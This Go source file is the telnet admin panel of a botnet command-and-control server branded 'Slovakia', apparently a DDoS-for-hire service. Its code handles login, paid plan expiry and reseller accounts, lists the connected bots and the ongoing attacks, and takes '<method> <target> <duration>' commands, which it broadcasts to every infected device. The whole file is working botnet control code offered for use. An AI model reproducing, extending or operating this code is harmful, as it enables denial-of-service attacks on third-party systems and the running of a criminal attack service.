package main

import (
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

// Admin is the main interface for admin management and controls
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;Slovakiabr0.com - PuTTY\007")); err != nil {
		return
	}

	conn.Read(make([]byte, 32))

	// Username will read from the terminal
	conn.Write([]byte("\x1bc\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[104m                             \033[0m\r\n"))
	conn.Write([]byte("\033[104m          \033[30mSlovakia           \033[104m\033[0m    \r\n"))
	conn.Write([]byte("\033[104m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	username, err := Read(conn, "\x1b[38;5;105musername\x1b[38;5;15m#\x1b[0m ", "", 20)
	if err != nil {
		return
	}

	account, err := FindUser(username)
	if err != nil || account == nil {
		conn.Write([]byte("\033[2J\x1bc\x1b[48;5;9m\x1b[38;5;16m Unknown username! \x1b[0m"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// Password will read from the terminal
	password, err := Read(conn, "\x1b[38;5;105mpassword\x1b[38;5;15m#\x1b[0m ", "#", 20)
	if err != nil {
		return
	} else if password != account.Password {
		conn.Write([]byte("\033[2J\x1bc\x1b[48;5;9m\x1b[38;5;16m Unknown password! \x1b[0m"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// User is a new user so therefore they will need to modify their password.
	if account.NewUser {
		conn.Write([]byte("\x1bc\x1b[38;5;245mAs you are a new-user you are required to change your password!\x1b[0m\r\n"))
		newpassword, err := Read(conn, "\x1b[38;5;105mpassword\x1b[38;5;15m#\x1b[0m ", "#", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte("\x1b[38;5;245mUnable to change password!"))
			time.Sleep(50 * time.Millisecond)
			return
		}

		ModifyField(account, "newuser", false)
	}

	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte("\x1bc\r\n"))
		conn.Write([]byte("\033[107m                             \033[0m\r\n"))
		conn.Write([]byte("\033[107m                             \033[0m\r\n"))
		conn.Write([]byte("\033[107m                             \033[0m\r\n"))
		conn.Write([]byte("\033[104m                             \033[0m\r\n"))
		conn.Write([]byte("\033[104m          \033[30mSlovakia           \033[104m\033[0m\r\n"))
		conn.Write([]byte("\033[104m                             \033[0m\r\n"))
		conn.Write([]byte("\033[101m                             \033[0m\r\n"))
		conn.Write([]byte("\033[101m                             \033[0m\r\n"))
		conn.Write([]byte("\033[101m                             \033[0m\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\x1b[38;5;15mYour plan has expired! contact your seller to renew!\x1b[0m"))
		time.Sleep(10 * time.Second)
		return
	}

	session := NewSession(conn, account)
	defer delete(Sessions, session.Opened.Unix())

	conn.Write([]byte("\x1bc\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[107m                             \033[0m\r\n"))
	conn.Write([]byte("\033[104m                             \033[0m\r\n"))
	conn.Write([]byte("\033[104m          \033[30mSlovakia           \033[104m\033[0m\r\n"))
	conn.Write([]byte("\033[104m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	conn.Write([]byte("\033[101m                             \033[0m\r\n"))
	conn.Write([]byte("\r\n"))

	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[97m%s\x1b[94m@\x1b[91mSlovakia\x1b[97m# ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}

		session.History = append(session.History, command)

		// Main command handling 
		switch strings.Split(strings.ToLower(command), " ")[0] {

		// Clear command
		case "clear", "cls":
			session.History = make([]string, 0)
			conn.Write([]byte("\x1bc\r\n"))
			conn.Write([]byte("\033[107m                             \033[0m\r\n"))
			conn.Write([]byte("\033[107m                             \033[0m\r\n"))
			conn.Write([]byte("\033[107m                             \033[0m\r\n"))
			conn.Write([]byte("\033[104m                             \033[0m\r\n"))
			conn.Write([]byte("\033[104m          \033[30mSlovakia           \033[104m\033[0m\r\n"))
			conn.Write([]byte("\033[104m                             \033[0m\r\n"))
			conn.Write([]byte("\033[101m                             \033[0m\r\n"))
			conn.Write([]byte("\033[101m                             \033[0m\r\n"))
			conn.Write([]byte("\033[101m                             \033[0m\r\n"))
			conn.Write([]byte("\r\n"))
			continue

		// Methods command
		case "methods", "method", "syntax":
			session.Conn.Write([]byte("\r\n"))
			item := MethodsFromMapToArray(make([]string, 0))
			sort.Slice(item, func(i, j int) bool {
				return len(item[i]) < len(item[j])
			})

			// Ranges through all the methods
			for _, name := range item {
				session.Conn.Write([]byte(fmt.Sprintf(strings.Repeat(" ", 4) + "\x1b[97m%s\x1b[94m - \x1b[91m%s.\x1b[97m\r\n", name, strings.ToLower(Methods[name].Description))))
			}

			session.Conn.Write([]byte("\r\n"))
			session.Conn.Write([]byte(fmt.Sprintf(strings.Repeat(" ", 4)+"\x1b[97mSyntax\x1b[94m:\x1b[91m <method> <target> <duration>\r\n")))
			session.Conn.Write([]byte(fmt.Sprintf(strings.Repeat(" ", 4)+"\x1b[97mExample\x1b[94m:\x1b[91m %s 8.8.8.8 %d\r\n", item[len(item)-1], session.User.Maxtime / 2)))
			session.Conn.Write([]byte("\r\n"))

		case "?", "help", "h":
			access := 2
			session.Conn.Write([]byte("\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[97mmethods\x1b[38;5;15m - \x1b[97mview all methods available\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[97mclear\x1b[38;5;15m - \x1b[97mclears your terminal and history\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[97mcreate\x1b[38;5;15m - \x1b[97mcreate a new user\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[94madmin\x1b[38;5;15m - \x1b[94mmodify a users admin status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[94mapi\x1b[38;5;15m - \x1b[94mmodify a users api status\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[94mbots\x1b[38;5;15m - \x1b[94mview the different types of bots connected\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[91mattacks \x1b[97m - \x1b[91menables or disables attacks\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[91mmaxtime\x1b[38;5;15m - \x1b[91mmodify a users maxtime\x1b[0m\r\n"))
			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[91musers\x1b[38;5;15m - \x1b[91msee the users in the database\x1b[0m\r\n"))
			session.Conn.Write([]byte("\r\n"))

			
		case "attacks": // Enable/Disable attacks possible.
			args := strings.Split(strings.ToLower(command), " ")[1:] 
			if !session.User.Admin || len(args) == 0 {
				session.Conn.Write([]byte("\x1b[38;5;9mAdmin access is needed for this command.\x1b[0m\r\n"))
				continue
			}

			switch strings.ToLower(args[0]) {

			case "enable", "active", "attacks": // Enable attacks
				Attacks = true
				session.Conn.Write([]byte("\x1b[38;5;10mAttacks are now enabled!\x1b[0m\r\n"))
			case "disable", "!attacks": // Disable attacks
				Attacks = false
				session.Conn.Write([]byte("\x1b[38;5;9mAttacks are now disabled!\x1b[0m\r\n"))

			case "global": // Change max cap
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				new, err := strconv.Atoi(args[1])
				if err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a new int for max.\x1b[0m\r\n"))
					continue
				}

				Options.Templates.Attacks.MaximumOngoing = new
				session.Conn.Write([]byte("\x1b[38;5;10mAttacks max running global cap changed!\x1b[0m\r\n"))

			case "reset_user": // Reset a users attack logs
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a username\x1b[0m\r\n"))
					continue
				}

				if usr, _ := FindUser(args[1]); usr == nil {
					session.Conn.Write([]byte("\x1b[38;5;9mInclude a valid username\x1b[0m\r\n"))
					continue
				}

				if err := CleanAttacksForUser(args[1]); err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mFailed to clean attack logs!\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte("\x1b[38;5;10mAttack logs reset for that user\x1b[0m\r\n"))
			}

			continue

		case "bots":
			// Non-admins can not see the different types of client sources connected
			if !session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;105mTotal\x1b[38;5;15m:\x1b[38;5;245m %d\x1b[0m\r\n", len(Clients))))
				continue
			}

			// Loops through all the access clients
			for source, amount := range SortClients(make(map[string]int)) {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;105m%s\x1b[38;5;15m:\x1b[38;5;245m %d\x1b[0m\r\n", source, amount)))
			}

			continue
		case "api": // API examples/help
			if !session.User.API && !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have API access!\x1b[0m\r\n"))
				continue
			} else if session.User.Admin || session.User.Reseller && session.User.API {
				args := strings.Split(command, " ")[1:]
				if len(args) <= 1 {
					session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				status, err := strconv.ParseBool(args[0])
				if err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
					continue
				}

				user, err := FindUser(args[1])
				if err != nil || user == nil {
					session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
					continue
				}

				if user.API == status{
					session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
					continue
				}

				if err := ModifyField(user, "api", status); err != nil {
					session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users api status\x1b[0m\r\n"))
					continue
				}

				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users api status to %v!\x1b[0m\r\n", status)))
				continue
			}
		

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mHey %s, it seems you have API access!\x1b[0m\r\n", session.User.Username)))

		case "admin":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Admin == status {
				session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "admin", status); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users admin status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users admin status to %v!\x1b[0m\r\n", status)))
			continue

		case "reseller":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & bool\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if user.Reseller == status {
				session.Conn.Write([]byte("\x1b[38;5;9mStatus is already what you are trying to change too\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "reseller", status); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users reseller status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users reseller status to %v!\x1b[0m\r\n", status)))
			continue

		case "maxtime":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			maxtime, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "maxtime", maxtime); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users maxtime status to %d!\x1b[0m\r\n", maxtime)))
			continue

		case "cooldown":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			cooldown, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "cooldown", cooldown); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users cooldown status to %d!\x1b[0m\r\n", cooldown)))
			continue

		case "conns":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			conns, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "conns", conns); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users conns status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users conns status to %d!\x1b[0m\r\n", conns)))
			continue

		case "max_daily":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "max_daily", days); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users max_daily status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users max_daily status to %d!\x1b[0m\r\n", days)))
			continue

		case "days":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou don't have the access for that!\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username & time\x1b[0m\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUser doesnt exist\x1b[0m\r\n"))
				continue
			}

			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days) * 24 * time.Hour).Unix()); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to modify users maxtime status\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;10mSuccessfully changed users expiry status to %d!\x1b[0m\r\n", days)))
			continue


		case "create": // Creates a new user
			if !session.User.Admin && !session.User.Reseller {
				session.Conn.Write([]byte("\x1b[38;5;9mOnly admins/resellers can currently create users!\x1b[0m\r\n"))
				continue
			}

			args := make(map[string]string)
			order := []string{"username", "password", "days"}
			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
				if pos - 1 >= len(order) {
					break
				}

				args[order[pos - 1]] = strings.Split(strings.ToLower(command), " ")[pos]
			}

			// Allows allocation not inside the args
			for _, item := range order {
				if _, ok := args[item]; ok {
					continue
				}
				value, err := Read(conn, item + "> ", "", 40)
				if err != nil {
					return
				}
				args[item] = value
			}

			if usr, _ := FindUser(args["username"]); usr != nil {
				session.Conn.Write([]byte("\x1b[38;5;11mUser already exists in SQL!\x1b[0m\r\n"))
				continue
			}

			expiry, err := strconv.Atoi(args["days"])
			if err != nil { 
				session.Conn.Write([]byte("\x1b[38;5;11mDays active must be a int!\x1b[0m\r\n"))
				continue
			}

			// Inserts the user into the database
			err = CreateUser(&User{Username: args["username"], Password: args["password"], Maxtime: Options.Templates.Database.Defaults.Maxtime, Admin: Options.Templates.Database.Defaults.Admin, API: Options.Templates.Database.Defaults.API, Cooldown: Options.Templates.Database.Defaults.Cooldown, Conns: Options.Templates.Database.Defaults.Concurrents, MaxDaily: Options.Templates.Database.Defaults.MaxDaily, NewUser: true, Expiry: time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix()})
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mError creating user inside the database!\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[38;5;10mUser created successfully\x1b[0m\r\n"))
			continue

		case "remove": // Remove a choosen user from the database
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 0 {
				session.Conn.Write([]byte("\x1b[38;5;9mYou must provide a username\x1b[0m\r\n"))
				continue
			}

			if usr, _ := FindUser(args[0]); usr == nil || err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mUnknown username\x1b[0m\r\n"))
				continue
			}

			if err := RemoveUser(args[0]); err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mFailed to remove user\x1b[0m\r\n"))
				continue
			}

			session.Conn.Write([]byte("\x1b[38;5;10mRemoved the user!\x1b[0m\r\n"))
			continue

		case "broadcast": // Broadcast a message to all the clients connected
			message := strings.Join(strings.Split(command, " ")[1:], " ")
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}
			
			for _, s := range Sessions {
				s.Conn.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[48;5;11m\x1b[38;5;16m " + fmt.Sprintf("%s", message) + " \x1b[0m\x1b8"))
			}

		case "users":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			users, err := GetUsers()
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mErr: "+ err.Error() +"\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Time"},
					{Align: simpletable.AlignCenter, Text: "Conns"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "MaxDaily"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[38;5;105m"},
				},
			}

			for _, u := range users {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(u.ID) + "\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.Username)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[38;5;15m", u.Maxtime)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[38;5;15m", u.Conns)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[38;5;15m", u.Cooldown)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;215m%d\x1b[38;5;15m", u.MaxDaily)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Admin) + "\x1b[38;5;15m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.Reseller) + "\x1b[38;5;15m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.API) + "\x1b[38;5;15m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "ongoing": // Global ongoing attacks
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + "#"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Finish\x1b[38;5;105m"},
				},
			}

			ongoing, err := OngoingAttacks(time.Now())
			if err != nil {
				session.Conn.Write([]byte("\x1b[38;5;9mCant fetch ongoing attacks\x1b[0m\r\n"))
				continue
			}

			for i, attack := range ongoing {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(i) + "\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: attack.Target},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.Duration)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(attack.User)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\x1b[38;5;9m%.2fsecs\x1b[38;5;15m", time.Until(time.Unix(attack.Finish, 0)).Seconds()) + "\x1b[38;5;105m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "sessions":
			if !session.User.Admin {
				session.Conn.Write([]byte("\x1b[38;5;9mYou need admin access for this command\x1b[0m\r\n"))
				continue
			}
			
			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "IP"},
					{Align: simpletable.AlignCenter, Text: "Admin"},
					{Align: simpletable.AlignCenter, Text: "Reseller"},
					{Align: simpletable.AlignCenter, Text: "API" + "\x1b[38;5;105m"},
				},
			}

			for i, u := range Sessions {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m" + fmt.Sprint(i) + "\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(u.User.Username)},
					{Align: simpletable.AlignCenter, Text: strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Admin) + "\x1b[38;5;15m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.Reseller) + "\x1b[38;5;15m")},
					{Align: simpletable.AlignCenter, Text: fmt.Sprint(FormatBool(u.User.API) + "\x1b[38;5;15m") + "\x1b[0m"},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		default:
			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
			if !ok && attack == nil {
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[38;5;245m`\x1b[38;5;9m\x1b[9m%s\x1b[0m\x1b[38;5;245m`\x1b[38;5;15m doesn't exist!\x1b[0m\r\n", strings.Split(strings.ToLower(command), " ")[0])))
				continue
			}

			// Builds the attack command into bytes
			payload, err := attack.Parse(strings.Split(command, " "), account)
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			bytes, err := payload.Bytes()
			if err != nil {
				session.Conn.Write([]byte(fmt.Sprint(err) + "\r\n"))
				continue
			}

			BroadcastClients(bytes)
			if len(Clients) <= 1 { // 1 or less clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[32;1mCommand broadcasted to %d active device!\x1b[0m\r\n", len(Clients))))
			} else { // 2 or more clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[32;1mCommand broadcasted to %d active devices!\x1b[0m\r\n", len(Clients))))
			}
		}
	}
}


// FormatBool will take the string and convert into a coloured boolean
func FormatBool(b bool) string {
	if b {
		return "\x1b[38;5;10mtrue\x1b[0m"
	}

	return "\x1b[38;5;9mfalse\x1b[0m"
}